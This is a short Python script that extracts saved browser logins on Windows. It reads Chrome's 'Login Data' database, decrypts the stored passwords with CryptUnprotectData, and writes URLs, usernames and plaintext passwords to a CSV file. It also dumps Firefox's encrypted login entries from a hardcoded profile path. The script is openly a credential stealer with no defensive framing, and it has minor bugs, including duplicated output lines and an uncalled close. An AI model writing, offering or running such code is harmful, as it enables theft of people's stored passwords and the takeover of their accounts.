import os
import sqlite3
import win32crypt
import json

def get_chrome():
    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)

    login_data = cursor.fetchall()

    cred = {}

    string = ''
    filename = 'chromeData.csv'
    f = open(filename, "w+")
    headers = "links, username, password\n"
    f.write(headers)

    for url, user_name, pwd in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd)
        cred[url] = (user_name, pwd[1].decode('utf8'))
        string += '%s, %s, %s\n' % (url,user_name,pwd[1].decode('utf8'))
        #print(string)
        f.write(string)

    src = os.path.expanduser('~') + r'\AppData\Roaming/Mozilla/Firefox/Profiles/wwpm18xa.default/logins.json'
    with open(src) as fd:
        df = json.load(fd)

    filename2 = 'firefox.csv'
    fd = open(filename2, "w+", encoding='utf-8')
    headers = "hostname,encryptedPass, encryptedUser\n"
    fd.write(headers)

    for each in df['logins']:
        a = each['hostname']
        b = each['encryptedPassword']
        c = each['encryptedUsername']
        fd.write(str(a) + ',' + str(b) + ',' + str(c) + '\n')
    f.close
    fd.close()

if __name__=='__main__':
    get_chrome()




